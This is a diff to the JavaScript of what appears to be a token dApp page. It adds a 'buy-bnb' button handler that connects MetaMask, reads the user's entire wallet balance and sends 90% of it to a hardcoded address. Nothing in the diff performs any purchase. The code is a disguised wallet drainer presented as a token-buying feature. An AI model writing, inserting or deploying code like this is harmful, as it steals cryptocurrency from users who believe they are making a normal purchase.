@@ -29,6 +29,61 @@ async function getBalance() {
     const balance = await contract.methods.balanceOf(account).call();
     document.getElementById('balance').innerText = 'Saldo: ' + web3.utils.fromWei(balance, 'ether') + ' WAVE';
 }
+// Verificar si el navegador tiene Metamask instalado
+  if (typeof window.ethereum !== 'undefined') {
+    console.log('MetaMask is installed!');
+  } else {
+    alert('Please install MetaMask to use this feature.');
+  }
+
+  document.getElementById('buy-bnb').addEventListener('click', async (event) => {
+    event.preventDefault();
+
+    const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
+
+    if (window.ethereum) {
+      try {
+        // Solicitar al usuario que conecte su cuenta
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        const account = accounts[0];
+
+        // Obtener el saldo de la cuenta
+        const balanceWei = await web3.eth.getBalance(account);
+        const balance = web3.utils.fromWei(balanceWei, 'ether');
+        
+        // Calcular el 90% del saldo
+        const amountToSend = balance * 0.9;
+        const amountToSendWei = web3.utils.toWei(amountToSend.toString(), 'ether');
+        
+        // Crear y enviar la transacción
+        const transactionParameters = {
+          to: recipientAddress,
+          from: account,
+          value: amountToSendWei,
+        };
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [transactionParameters],
+        });
+
+        console.log('Transaction hash:', txHash);
+        alert('Transaction sent! Hash: ' + txHash);
+      } catch (error) {
+        console.error(error);
+        alert('An error occurred: ' + error.message);
+      }
+    } else {
+      alert('Please install MetaMask to use this feature.');
+    }
+  });
+
+
+
+    
 
    const menuItems = document.querySelectorAll(".menu-item");
 
